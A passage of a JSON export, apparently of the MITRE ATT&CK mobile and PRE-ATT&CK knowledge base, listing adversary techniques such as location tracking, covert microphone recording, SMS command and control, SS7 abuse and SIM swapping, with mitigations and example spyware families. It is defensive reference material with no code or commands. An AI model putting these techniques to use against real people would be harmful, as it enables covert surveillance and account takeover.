                {
                    "Name": "AndroRAT",
                    "Description": "AndroRAT collects contact list information.[3]"
                },
                {
                    "Name": "Charger",
                    "Description": "Charger steals contacts from the victim user's device.[4]"
                },
                {
                    "Name": "Pegasus for Android",
                    "Description": "Pegasus for Android accesses contact list information.[5]"
                },
                {
                    "Name": "Pegasus for iOS",
                    "Description": "Pegasus for iOS gathers contacts from the system by dumping the victim's address book.[6]"
                },
                {
                    "Name": "SpyDealer",
                    "Description": "SpyDealer harvests contact lists from victims.[7]"
                },
                {
                    "Name": "SpyNote RAT",
                    "Description": "SpyNote RAT can view contacts.[8]"
                },
                {
                    "Name": "Stealth Mango",
                    "Description": "Stealth Mango uploads contact lists for various third-party applications such as Yahoo, AIM, GoogleTalk, Skype, QQ, and others.[9]"
                }
            ]
        },
        "Location Tracking": {
            "Name": "Location Tracking",
            "Description": "An adversary could use a malicious or exploited application to surreptitiously track the device's physical location through use of standard operating system APIs.\n",
            "ID": "T1430",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Collection",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-24",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "On Android, applications must request the ACCESS_COARSE_LOCATION or ACCESS_FINE_LOCATION permission to access the device's physical location. Extra scrutiny could be given to applications that request these permissions. On iOS, calls to the relevant APIs could be detected during the vetting process."
                }
            ],
            "Examples": [
                {
                    "Name": "Adups",
                    "Description": "Adups transmitted location information.[1]"
                },
                {
                    "Name": "Android/Chuli.A",
                    "Description": "Android/Chuli.A stole geo-location data.[2]"
                },
                {
                    "Name": "AndroRAT",
                    "Description": "AndroRAT tracks the device location.[3]"
                },
                {
                    "Name": "Charger",
                    "Description": "Charger checks the local settings of the device and does not run its malicious logic if the device is located in Ukraine, Russia, or Belarus.[4]"
                },
                {
                    "Name": "Pegasus for iOS",
                    "Description": "Pegasus for iOS update and sends the location of the phone.[5]"
                },
                {
                    "Name": "PJApps",
                    "Description": "PJApps has the capability to collect and leak the victim's location.[3]"
                },
                {
                    "Name": "RCSAndroid",
                    "Description": "RCSAndroid can record location.[6]"
                },
                {
                    "Name": "SpyDealer",
                    "Description": "SpyDealer harvests location data from victims..[7]"
                },
                {
                    "Name": "SpyNote RAT",
                    "Description": "SpyNote RAT collects the device's location.[8]"
                },
                {
                    "Name": "Stealth Mango",
                    "Description": "Stealth Mango can perform GPS location tracking as well as capturing coordinates as when an SMS message or call is received.[9]"
                },
                {
                    "Name": "Tangelo",
                    "Description": "Tangelo contains functionality to gather GPS coordinates.[9]"
                },
                {
                    "Name": "X-Agent for Android",
                    "Description": "X-Agent for Android was believed to have been used to obtain locational data of Ukrainian artillery forces.[10]"
                }
            ]
        },
        "Microphone or Camera Recordings": {
            "Name": "Microphone or Camera Recordings",
            "Description": "An adversary could use a malicious or exploited application to surreptitiously record activities using the device microphone and/or camera through use of standard operating system APIs.\n",
            "ID": "T1429",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Collection",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-19",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "On Android, applications must request the RECORD_AUDIO permission to access the microphone and the CAMERA permission to access the camera. Extra scrutiny could be given to applications that request these permissions. On iOS, calls to the relevant APIs could be detected during the vetting process."
                }
            ],
            "Examples": [
                {
                    "Name": "AndroRAT",
                    "Description": "AndroRAT gathers audio from the microphone.[1]"
                },
                {
                    "Name": "Dendroid",
                    "Description": "Dendroid can take pictures using the phone’s camera as well as record audio and video.[2]"
                },
                {
                    "Name": "DroidJack",
                    "Description": "DroidJack RAT performs call recording and video capturing.[3]"
                },
                {
                    "Name": "Pegasus for Android",
                    "Description": "Pegasus for Android has the ability to record audio and take pictures using the device camera.[4]"
                },
                {
                    "Name": "Pegasus for iOS",
                    "Description": "Pegasus for iOS has the ability to record audio.[5]"
                },
                {
                    "Name": "RCSAndroid",
                    "Description": "RCSAndroid can record using the microphone as well as capture photos using the front and back cameras.[6]"
                },
                {
                    "Name": "RedDrop",
                    "Description": "RedDrop exfiltrates locally saved files (including photos) as well as live recordings of the device's surroundings.[7]"
                },
                {
                    "Name": "Skygofree",
                    "Description": "Skygofree can record audio via the microphone when an infected device is in a specified location as well as record a video or capture a photo.[8]"
                },
                {
                    "Name": "SpyDealer",
                    "Description": "SpyDealer can record phone calls and surrounding audio and video, as well as take photos via front and rear cameras.[9]"
                },
                {
                    "Name": "SpyNote RAT",
                    "Description": "SpyNote RAT can activate the victim's microphone.[10]"
                },
                {
                    "Name": "Stealth Mango",
                    "Description": "Stealth Mango can record from the camera or microphone as well as take photos from the front and back cameras.[11]"
                },
                {
                    "Name": "Tangelo",
                    "Description": "Tangelo contains functionality to record calls as well as the victim device's environment.[11]"
                },
                {
                    "Name": "XLoader",
                    "Description": "XLoader covertly records phone calls.[12]"
                }
            ]
        },
        "Alternate Network Mediums": {
            "Name": "Alternate Network Mediums",
            "Description": "Adversaries can communicate using cellular networks rather than enterprise Wi-Fi in order to bypass enterprise network monitoring systems. Adversaries may also communicate using other non-Internet Protocol mediums such as SMS, NFC, or Bluetooth to bypass network monitoring systems.\n",
            "ID": "T1438",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Command And Control, Exfiltration",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-30",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Android/Chuli.A",
                    "Description": "Android/Chuli.A used SMS to receive command and control messages.[1]"
                },
                {
                    "Name": "Pegasus for Android",
                    "Description": "Pegasus for Android uses SMS for command and control.[2]"
                },
                {
                    "Name": "Pegasus for iOS",
                    "Description": "Pegasus for iOS uses SMS for command and control.[3]"
                },
                {
                    "Name": "RCSAndroid",
                    "Description": "RCSAndroid can use SMS for command and control.[4]"
                },
                {
                    "Name": "Skygofree",
                    "Description": "Skygofree can be controlled via binary SMS.[5]"
                },
                {
                    "Name": "SpyDealer",
                    "Description": "SpyDealer enables remote control of the victim through SMS channels.[6]"
                },
                {
                    "Name": "Stealth Mango",
                    "Description": "Stealth Mango uses commands received from text messages for C2.[7]"
                }
            ]
        },
        "Commonly Used Port": {
            "Name": "Commonly Used Port",
            "Description": "Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such asTCP:80 (HTTP)TCP:443 (HTTPS)TCP:25 (SMTP)TCP/UDP:53 (DNS)They may use the protocol associated with the port or a completely different protocol.\n",
            "ID": "T1436",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Command And Control, Exfiltration",
            "Platform: ": "Android, iOS",
            "Version": "1.0"
        },
        "Standard Application Layer Protocol": {
            "Name": "Standard Application Layer Protocol",
            "Description": "Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic.In the mobile environment, the Google Cloud Messaging (GCM; two-way) and Apple Push Notification Service (APNS; one-way server-to-device) are commonly used protocols on Android and iOS respectively that would blend in with routine device traffic and are difficult for enterprises to inspect. As described by Kaspersky [1], Google responds to reports of abuse by blocking access to GCM.\n",
            "ID": "T1437",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Command And Control, Exfiltration",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-29",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Android/Chuli.A",
                    "Description": "Android/Chuli.A used HTTP uploads to a URL as a command and control mechanism.[2]"
                },
                {
                    "Name": "ANDROIDOS_ANSERVER.A",
                    "Description": "ANDROIDOS_ANSERVER.A uses encrypted content within a blog site for part of its command and control. Specifically, the encrypted content contains URLs for other servers to be used for other aspects of command and control.[3]"
                },
                {
                    "Name": "RedDrop",
                    "Description": "RedDrop exfiltrates data using standard HTTP.[4]"
                },
                {
                    "Name": "RuMMS",
                    "Description": "RuMMS uses HTTP for command and control.[5]"
                },
                {
                    "Name": "Skygofree",
                    "Description": "Skygofree can be controlled via HTTP, XMPP, FirebaseCloudMessaging, or GoogleCloudMessaging in older versions.[6]"
                },
                {
                    "Name": "Trojan-SMS.AndroidOS.Agent.ao",
                    "Description": "Trojan-SMS.AndroidOS.Agent.ao uses Google Cloud Messaging (GCM) for command and control.[1]"
                },
                {
                    "Name": "Trojan-SMS.AndroidOS.FakeInst.a",
                    "Description": "Trojan-SMS.AndroidOS.FakeInst.a uses Google Cloud Messaging (GCM) for command and control.[1]"
                },
                {
                    "Name": "Trojan-SMS.AndroidOS.OpFake.a",
                    "Description": "Trojan-SMS.AndroidOS.OpFake.a uses Google Cloud Messaging (GCM) for command and control.[1]"
                },
                {
                    "Name": "Twitoor",
                    "Description": "Twitoor uses Twitter for command and control.[7]"
                }
            ]
        },
        "Downgrade to Insecure Protocols": {
            "Name": "Downgrade to Insecure Protocols",
            "Description": "An adversary could cause the mobile device to use less secure protocols, for example by jamming frequencies used by newer protocols such as LTE and only allowing older protocols such as GSM to communicate as described in NIST SP 800-187 [1]. Use of less secure protocols may make communication easier to eavesdrop upon or manipulate.\n",
            "ID": "T1466",
            "Tactic Type: ": "Without Adversary Device Access",
            "Tactic": "Network Effects",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "CEL-3",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Encrypt Network Traffic",
                    "Description": "Application-layer encryption (e.g. use of the Transport Layer Security protocol) or a Virtual Private Network (VPN) tunnel (e.g. using the IPsec protocol) may help mitigate weaknesses in the cellular network encryption."
                }
            ]
        },
        "Eavesdrop on Insecure Network Communication": {
            "Name": "Eavesdrop on Insecure Network Communication",
            "Description": "If network traffic between the mobile device and remote servers is unencrypted or is encrypted in an insecure manner, then an adversary positioned on the network can eavesdrop on communication. For example, He et al. [1] describe numerous healthcare-related applications that did not properly protect network communication.\n",
            "ID": "T1439",
            "Tactic Type: ": "Without Adversary Device Access",
            "Tactic": "Network Effects",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-0, APP-1",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Encrypt Network Traffic",
                    "Description": ""
                }
            ]
        },
        "Exploit SS7 to Redirect Phone Calls/SMS": {
            "Name": "Exploit SS7 to Redirect Phone Calls/SMS",
            "Description": "An adversary could exploit signaling system vulnerabilities to redirect calls or text messages to a phone number under the attacker's control. The adversary could then act as a man-in-the-middle to intercept or manipulate the communication. [1] [2] [3] [4] [5]\n",
            "ID": "T1449",
            "Tactic Type: ": "Without Adversary Device Access",
            "Tactic": "Network Effects",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "CEL-37",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Encrypt Network Traffic",
                    "Description": "The CSRIC notes that use of end-to-end encryption of voice calls and text messages \"provides another layer in the defense against potential information compromise by SS7 enabled eavesdropping.\"[5]"
                },
                {
                    "Mitigation": "Interconnection Filtering",
                    "Description": ""
                }
            ]
        },
        "Exploit SS7 to Track Device Location": {
            "Name": "Exploit SS7 to Track Device Location",
            "Description": "An adversary could exploit signaling system vulnerabilities to track the location of mobile devices. [1] [2] [3] [4] [5]\n",
            "ID": "T1450",
            "Tactic Type: ": "Without Adversary Device Access",
            "Tactic": "Network Effects",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "CEL-38",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Interconnection Filtering",
                    "Description": ""
                }
            ]
        },
        "Jamming or Denial of Service": {
            "Name": "Jamming or Denial of Service",
            "Description": "An attacker could jam radio signals (e.g. Wi-Fi, cellular, GPS) to prevent the mobile device from communicating. [1]\n",
            "ID": "T1464",
            "Tactic Type: ": "Without Adversary Device Access",
            "Tactic": "Network Effects",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "CEL-7, CEL-8, LPN-5, GPS-0",
            "Version": "1.0"
        },
        "Manipulate Device Communication": {
            "Name": "Manipulate Device Communication",
            "Description": "If network traffic between the mobile device and a remote server is not securely protected, then an attacker positioned on the network may be able to manipulate network communication without being detected. For example, FireEye researchers found in 2014 that 68% of the top 1,000 free applications in the Google Play Store had at least one Transport Layer Security (TLS) implementation vulnerability potentially opening the applications' network traffic to man-in-the-middle attacks [1].\n",
            "ID": "T1463",
            "Tactic Type: ": "Without Adversary Device Access",
            "Tactic": "Network Effects",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-1",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Application vetting techniques can scan for use of cleartext communication, insecure TrustManager implementations, and other potential network communication weaknesses. The Google Play Store now automatically assesses submitted applications for insecure TrustManager implementations.[2]"
                },
                {
                    "Mitigation": "Encrypt Network Traffic",
                    "Description": "App developers should be advised to use the Android Network Security Configuration feature and the iOS App Transport Security feature to gain some level of assurance that app network traffic is protected.[2]"
                }
            ]
        },
        "Rogue Cellular Base Station": {
            "Name": "Rogue Cellular Base Station",
            "Description": "An adversary could set up a rogue cellular base station and then use it to eavesdrop on or manipulate cellular device communication. For example, Ritter and DePerry of iSEC Partners demonstrated this technique using a compromised cellular femtocell at Black Hat USA 2013 [1].\n",
            "ID": "T1467",
            "Tactic Type: ": "Without Adversary Device Access",
            "Tactic": "Network Effects",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "CEL-7",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Encrypt Network Traffic",
                    "Description": ""
                }
            ]
        },
        "Rogue Wi-Fi Access Points": {
            "Name": "Rogue Wi-Fi Access Points",
            "Description": "An adversary could set up unauthorized Wi-Fi access points or compromise existing access points and, if the device connects to them, carry out network-based attacks such as eavesdropping on or modifying network communication as described in NIST SP 800-153 [1]. For example, Kaspersky describes a threat actor they call DarkHotel that targeted hotel Wi-Fi networks, using them to compromise computers belonging to business executives [2].\n",
            "ID": "T1465",
            "Tactic Type: ": "Without Adversary Device Access",
            "Tactic": "Network Effects",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "LPN-0",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Encrypt Network Traffic",
                    "Description": "Application-layer encryption (e.g. use of the Transport Layer Security protocol) or a Virtual Private Network (VPN) tunnel (e.g. using the IPsec protocol) may help mitigate use of untrusted Wi-Fi networks."
                },
                {
                    "Mitigation": "Enterprise Policy",
                    "Description": "Enterprise policies could be provisioned to devices to control the Wi-Fi access points that they are allowed to connect to."
                }
            ]
        },
        "SIM Card Swap": {
            "Name": "SIM Card Swap",
            "Description": "An adversary could convince the mobile network operator (e.g. through social networking, forged identification, or insider attacks performed by trusted employees) to issue a new SIM card and associate it with an existing phone number and account [1] [2]. The adversary could then obtain SMS messages or hijack phone calls intended for someone else [3]. One use case is intercepting authentication messages or phone calls to obtain illicit access to online banking or other online accounts, as many online services allow account password resets by sending an authentication code over SMS to a phone number associated with the account [4] [5].\n",
            "ID": "T1451",
            "Tactic Type: ": "Without Adversary Device Access",
            "Tactic": "Network Effects",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "STA-22",
            "Version": "1.0"
        },
        "Obtain Device Cloud Backups": {
            "Name": "Obtain Device Cloud Backups",
            "Description": "An adversary who is able to obtain unauthorized access to or misuse authorized access to cloud backup services (e.g. Google's Android backup service or Apple's iCloud) could use that access to obtain sensitive data stored in device backups. For example, the Elcomsoft Phone Breaker product advertises the ability to retrieve iOS backup data from Apple's iCloud [1]. Elcomsoft also describes [2] obtaining WhatsApp communication histories from backups stored in iCloud.\n",
            "ID": "T1470",
            "Tactic Type: ": "Without Adversary Device Access",
            "Tactic": "Remote Service Effects",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "ECO-0, ECO-1",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "User Guidance",
                    "Description": "Encourage users to protect their account credentials and to enable available multi-factor authentication options."
                }
            ]
        },
        "Remotely Track Device Without Authorization": {
            "Name": "Remotely Track Device Without Authorization",
            "Description": "An adversary who is able to obtain unauthorized access to or misuse authorized access to cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or to an enterprise mobility management (EMM) / mobile device management (MDM) server console could use that access to track mobile devices.\n",
            "ID": "T1468",
            "Tactic Type: ": "Without Adversary Device Access",
            "Tactic": "Remote Service Effects",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "ECO-5, EMM-7",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "User Guidance",
                    "Description": "Encourage users to protect their account credentials and to enable available multi-factor authentication options."
                }
            ]
        },
        "Remotely Wipe Data Without Authorization": {
            "Name": "Remotely Wipe Data Without Authorization",
            "Description": "An adversary who is able to obtain unauthorized access to or misuse authorized access to cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or to an EMM console could use that access to wipe enrolled devices [1].\n",
            "ID": "T1469",
            "Tactic Type: ": "Without Adversary Device Access",
            "Tactic": "Remote Service Effects",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "ECO-5, EMM-7",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "User Guidance",
                    "Description": "Encourage users to protect their account credentials and to enable available multi-factor authentication options."
                }
            ]
        }
    },
    "PRE-ATT&CK": {
        "Assess current holdings, needs, and wants": {
            "Name": "Assess current holdings, needs, and wants",
            "Description": "Analysts assess current information available against requirements that outline needs and wants as part of the research baselining process to begin satisfying a requirement. [1] [2] [3] [4]\n",
            "ID": "T1236",
            "Tactic": "Priority Definition Planning",
            "Version": "1.0"
        },
        "Assess KITs/KIQs benefits": {
            "Name": "Assess KITs/KIQs benefits",
            "Description": "Key Intelligence Topics (KITs) and Key Intelligence Questions (KIQs) may be further subdivided to focus on political, economic, diplomatic, military, financial, or intellectual property categories.  An adversary may specify KITs or KIQs in this manner in order to understand how the information they are pursuing can have multiple uses and to consider all aspects of the types of information they need to target for a particular purpose. [1] [1]KIT.\n",
            "ID": "T1229",
            "Tactic": "Priority Definition Planning",
            "Version": "1.0"
        },
        "Assess leadership areas of interest": {
            "Name": "Assess leadership areas of interest",
            "Description": "Leadership assesses the areas of most interest to them and generates Key Intelligence Topics (KIT) or Key Intelligence Questions (KIQ). For example, an adversary knows from open and closed source reporting that cyber is of interest, resulting in it being a KIT. [1]\n",
            "ID": "T1224",
            "Tactic": "Priority Definition Planning",
            "Version": "1.0"
        },
        "Assign KITs/KIQs into categories": {
            "Name": "Assign KITs/KIQs into categories",
            "Description": "Leadership organizes Key Intelligence Topics (KITs) and Key Intelligence Questions (KIQs) into three types of categories and creates more if necessary.  An example of a description of key players KIT would be when an adversary assesses the cyber defensive capabilities of a nation-state threat actor. [1]\n",
            "ID": "T1228",
            "Tactic": "Priority Definition Planning",
            "Version": "1.0"
        },
        "Conduct cost/benefit analysis": {
            "Name": "Conduct cost/benefit analysis",
            "Description": "Leadership conducts a cost/benefit analysis that generates a compelling need for information gathering which triggers a Key Intelligence Toptic (KIT) or Key Intelligence Question (KIQ). For example, an adversary compares the cost of cyber intrusions with the expected benefits from increased intelligence collection on cyber adversaries. [1] [2]\n",
            "ID": "T1226",
            "Tactic": "Priority Definition Planning",
            "Version": "1.0"
        },
        "Create implementation plan": {
            "Name": "Create implementation plan",
            "Description": "Implementation plans specify how the goals of the strategic plan will be executed. [1] [2]\n",
            "ID": "T1232",
            "Tactic": "Priority Definition Planning",
            "Version": "1.0"
        },
        "Create strategic plan": {
            "Name": "Create strategic plan",
            "Description": "Strategic plans outline the mission, vision, and goals for an adversary at a high level in relation to the key partners, topics, and functions the adversary carries out. [1] [2] [3]\n",
            "ID": "T1231",
            "Tactic": "Priority Definition Planning",
            "Version": "1.0"
        },
        "Derive intelligence requirements": {
            "Name": "Derive intelligence requirements",
            "Description": "Leadership or key decision makers may derive specific intelligence requirements from Key Intelligence Topics (KITs) or Key Intelligence Questions (KIQs).  Specific intelligence requirements assist analysts in gathering information to establish a baseline of information about a topic or question and collection managers to clarify the types of information that should be collected to satisfy the requirement. [1] [2]\n",
            "ID": "T1230",
            "Tactic": "Priority Definition Planning",
            "Version": "1.0"
        },
        "Develop KITs/KIQs": {
            "Name": "Develop KITs/KIQs",
            "Description": "Leadership derives Key Intelligence Topics (KITs) and Key Intelligence Questions (KIQs) from the areas of most interest to them.  KITs are an expression of management's intelligence needs with respect to early warning, strategic and operational decisions, knowing the competition, and understanding the competitive situation. KIQs are the critical questions aligned by KIT which provide the basis for collection plans, create a context for analytic work, and/or identify necessary external operations. [1]\n",
            "ID": "T1227",
            "Tactic": "Priority Definition Planning",
            "Version": "1.0"
        },
        "Generate analyst intelligence requirements": {
            "Name": "Generate analyst intelligence requirements",
            "Description": "Analysts may receive Key Intelligence Topics (KITs) and Key Intelligence Questions (KIQs) from leadership or key decision makers and generate intelligence requirements to articulate intricacies of information required on a topic or question. [1]\n",
            "ID": "T1234",
            "Tactic": "Priority Definition Planning",
            "Version": "1.0"
        },
        "Identify analyst level gaps": {
            "Name": "Identify analyst level gaps",
            "Description": "Analysts identify gap areas that generate a compelling need to generate a Key Intelligence Topic (KIT) or Key Intelligence Question (KIQ). [1] [2] [3]\n",
            "ID": "T1233",
            "Tactic": "Priority Definition Planning",
            "Version": "1.0"
        },
        "Identify gap areas": {
            "Name": "Identify gap areas",
            "Description": "Leadership identifies gap areas that generate a compelling need to generate a Key Intelligence Topic (KIT) or Key Intelligence Question (KIQ). [1] [2]\n",
            "ID": "T1225",
            "Tactic": "Priority Definition Planning",
            "Version": "1.0"
        },
        "Receive operator KITs/KIQs tasking": {
            "Name": "Receive operator KITs/KIQs tasking",
            "Description": "Analysts may receive intelligence requirements from leadership and begin research process to satisfy a requirement.  Part of this process may include delineating between needs and wants and thinking through all the possible aspects associating with satisfying a requirement. [1]\n",
            "ID": "T1235",
            "Tactic": "Priority Definition Planning",
            "Version": "1.0"
        },
        "Assign KITs, KIQs, and/or intelligence requirements": {
            "Name": "Assign KITs, KIQs, and/or intelligence requirements",
            "Description": "Once generated, Key Intelligence Topics (KITs), Key Intelligence Questions (KIQs), and/or intelligence requirements are assigned to applicable agencies and/or personnel. For example, an adversary may decide nuclear energy requirements should be assigned to a specific organization based on their mission. [1] [2]\n",
            "ID": "T1238",
            "Tactic": "Priority Definition Direction",
            "Version": "1.0"
        },
        "Receive KITs/KIQs and determine requirements": {
            "Name": "Receive KITs/KIQs and determine requirements",
            "Description": "Applicable agencies and/or personnel receive intelligence requirements and evaluate them to determine sub-requirements related to topics, questions, or requirements.  For example, an adversary's  nuclear energy requirements may be further divided into nuclear facilities versus nuclear warhead capabilities. [1]\n",
            "ID": "T1239",
            "Tactic": "Priority Definition Direction",
            "Version": "1.0"
        },
        "Submit KITs, KIQs, and intelligence requirements": {
            "Name": "Submit KITs, KIQs, and intelligence requirements",
            "Description": "Once they have been created, intelligence requirements, Key Intelligence Topics (KITs), and Key Intelligence Questions (KIQs) are submitted into a central management system. [1] [2]\n",
            "ID": "T1237",
            "Tactic": "Priority Definition Direction",
            "Version": "1.0"
        },
        "Task requirements": {
            "Name": "Task requirements",
            "Description": "Once divided into the most granular parts, analysts work with collection managers to task the collection management system with requirements and sub-requirements. [1] [2]\n",
            "ID": "T1240",
            "Tactic": "Priority Definition Direction",
            "Version": "1.0"
        },
        "Determine approach/attack vector": {
            "Name": "Determine approach/attack vector",
            "Description": "The approach or attack vector outlines the specifics behind how the adversary would like to attack the target.  As additional information is known through the other phases of PRE-ATT&CK, an adversary may update the approach or attack vector. [1] [2] [3] [4] [5]\n",
            "ID": "T1245",
            "Tactic": "Target Selection",
            "Version": "1.0"
        },
        "Determine highest level tactical element": {
            "Name": "Determine highest level tactical element",
            "Description": "From a tactical viewpoint, an adversary could potentially have a primary and secondary level target.  The primary target represents the highest level tactical element the adversary wishes to attack.  For example, the corporate network within a corporation or the division within an agency. [1] [2] [3] [4]\n",
            "ID": "T1243",
            "Tactic": "Target Selection",
            "Version": "1.0"
        },
        "Determine operational element": {
            "Name": "Determine operational element",
            "Description": "If going from strategic down to tactical or vice versa, an  adversary would next consider the operational element.  For example, the specific company within an industry or agency within a government. [1] [2] [3] [4]\n",
            "ID": "T1242",
            "Tactic": "Target Selection",
            "Version": "1.0"
        },
        "Determine secondary level tactical element": {
            "Name": "Determine secondary level tactical element",
            "Description": "The secondary level tactical element the adversary seeks to attack is the specific network or area of a network that is vulnerable to attack.  Within the corporate network example, the secondary level tactical element might be a SQL server or a domain controller with a known vulnerability. [1] [2] [3] [4]\n",
            "ID": "T1244",
            "Tactic": "Target Selection",
            "Version": "1.0"
        },
        "Determine strategic target": {
            "Name": "Determine strategic target",
            "Description": "An adversary undergoes an iterative target selection process that may begin either broadly and narrow down into specifics (strategic to tactical) or narrowly and expand outward (tactical to strategic).  As part of this process, an adversary may determine a high level target they wish to attack. One example of this may be a particular country, government, or commercial sector. [1] [2] [3] [4]\n",
            "ID": "T1241",
            "Tactic": "Target Selection",
            "Version": "1.0"
        },
        "Acquire OSINT data sets and information": {
            "Name": "Acquire OSINT data sets and information",
            "Description": "Data sets can be anything from Security Exchange Commission (SEC) filings to public phone numbers. Many datasets are now either publicly available for free or can be purchased from a variety of data vendors.  Open source intelligence (OSINT) is intelligence gathered from publicly available sources. This can include both information gathered on-line as well as in the physical world. [1] [2] [3]\n",
            "ID": "T1277",
            "Tactic": "Organizational Information Gathering",
            "Version": "1.0"
        },
        "Conduct active scanning": {
            "Name": "Conduct active scanning",
            "Description": "Active scanning is the act of sending transmissions to end nodes, and analyzing the responses, in order to identify information about the communications system. [1]\n",
            "ID": "T1254",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Conduct passive scanning": {
            "Name": "Conduct passive scanning",
            "Description": "Passive scanning is the act of looking at existing network traffic in order to identify information about the communications system. [1] [2]\n",
            "ID": "T1253",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Conduct social engineering": {
            "Name": "Conduct social engineering",
            "Description": "Social Engineering is the practice of manipulating people in order to get them to divulge information or take an action. [1] [2]\n",
            "ID": "T1279",
            "Tactic": "Organizational Information Gathering",
            "Version": "1.0"
        },
        "Determine 3rd party infrastructure services": {
            "Name": "Determine 3rd party infrastructure services",
            "Description": "A wide variety of cloud, virtual private services, hosting, compute, and storage solutions are available as 3rd party infrastructure services. These services could provide an adversary with another avenue of approach or compromise. [1] [2] [3]\n",
            "ID": "T1284",
            "Tactic": "Organizational Information Gathering",
            "Version": "1.0"
        },
        "Determine domain and IP address space": {
            "Name": "Determine domain and IP address space",
            "Description": "Domain Names are the human readable names used to represent one or more IP addresses. IP addresses are the unique identifier of computing devices on a network. Both pieces of information are valuable to an adversary who is looking to understand the structure of a network. [1]\n",
            "ID": "T1250",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Determine external network trust dependencies": {
            "Name": "Determine external network trust dependencies",
            "Description": "Network trusts enable communications between different networks with specific accesses and permissions. Network trusts could include the implementation of domain trusts or the use of virtual private networks (VPNs). [1] [2] [3]\n",
            "ID": "T1259",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Determine firmware version": {
            "Name": "Determine firmware version",
            "Description": "Firmware is permanent software programmed into the read-only memory of a device. As with other types of software, firmware may be updated over time and have multiple versions. [1]\n",
            "ID": "T1258",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Discover target logon/email address format": {
            "Name": "Discover target logon/email address format",
            "Description": "Email addresses, logon credentials, and other forms of online identification typically share a common format. This makes guessing other credentials within the same domain easier. For example if a known email address is first.last@company.com it is likely that others in the company will have an email in the same format. [1]\n",
            "ID": "T1255",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Enumerate client configurations": {
            "Name": "Enumerate client configurations",
            "Description": "Client configurations information such as the operating system and web browser, along with additional information such as version or language, are often transmitted as part of web browsing communications.  This can be accomplished in several ways including use of a compromised web site to collect details on visiting computers. [1] [2]\n",
            "ID": "T1262",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Enumerate externally facing software applications technologies, languages, and dependencies": {
            "Name": "Enumerate externally facing software applications technologies, languages, and dependencies",
            "Description": "Software applications will be built using different technologies, languages, and dependencies. This information may reveal vulnerabilities or opportunities to an adversary. [1] [2] [3]\n",
            "ID": "T1261",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Identify job postings and needs/gaps": {
            "Name": "Identify job postings and needs/gaps",
            "Description": "Job postings, on either company sites, or in other forums, provide information on organizational structure, needs, and gaps in an organization. This may give an adversary an indication of weakness in an organization (such as under-resourced IT shop). Job postings can also provide information on an organizations structure which could be valuable in social engineering attempts. [1] [2]\n",
            "ID": "T1278",
            "Tactic": "Organizational Information Gathering",
            "Version": "1.0"
        },
        "Identify security defensive capabilities": {
            "Name": "Identify security defensive capabilities",
            "Description": "Security defensive capabilities are designed to stop or limit unauthorized network traffic or other types of accesses. [1] [2]\n",
            "ID": "T1263",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Identify supply chains": {
            "Name": "Identify supply chains",
            "Description": "Supply chains include the people, processes, and technologies used to move a product or service from a supplier to a consumer. Understanding supply chains may provide an adversary with opportunities to exploit organizational relationships. [1] [2]\n",
            "ID": "T1276",
            "Tactic": "Organizational Information Gathering",
            "Version": "1.0"
        },
        "Identify technology usage patterns": {
            "Name": "Identify technology usage patterns",
            "Description": "Technology usage patterns include identifying if users work offsite, connect remotely, or other possibly less restricted/secured access techniques. [1]\n",
            "ID": "T1264",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Identify web defensive services": {
            "Name": "Identify web defensive services",
